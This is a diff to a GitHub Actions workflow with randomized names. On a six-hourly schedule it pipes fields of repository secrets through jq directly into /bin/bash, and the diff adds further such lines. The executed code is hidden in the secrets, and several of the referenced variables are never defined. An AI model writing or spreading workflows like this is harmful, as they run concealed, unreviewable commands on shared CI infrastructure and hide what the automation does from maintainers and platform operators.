@@ -1,18 +1,23 @@
 name: weiqilang4891
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 0/6 * * *'
-jobs:  # 27625
+    - cron: '8 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: weiqilang4891
         env:
-          utblf788: ${{ secrets.utblf788 }}
+          ob67: ${{ secrets.ob67 }}
         run: |
-          echo $utblf788 | jq -r .fukdw9 | /bin/bash
-          echo $o13 | jq -r .avuja3306 | /bin/bash
-          echo $gdjbo0 | jq -r .vnzyv26 | /bin/bash
+          echo $ob67 | jq -r .dyj5703 | /bin/bash
+          echo $llgm442 | jq -r .ekac19331 | /bin/bash
+          echo $xi10 | jq -r .npsw7957 | /bin/bash
+          echo $tnlv205 | jq -r .bjrd0792 | /bin/bash
+          echo $u61 | jq -r .ngdj8 | /bin/bash
 
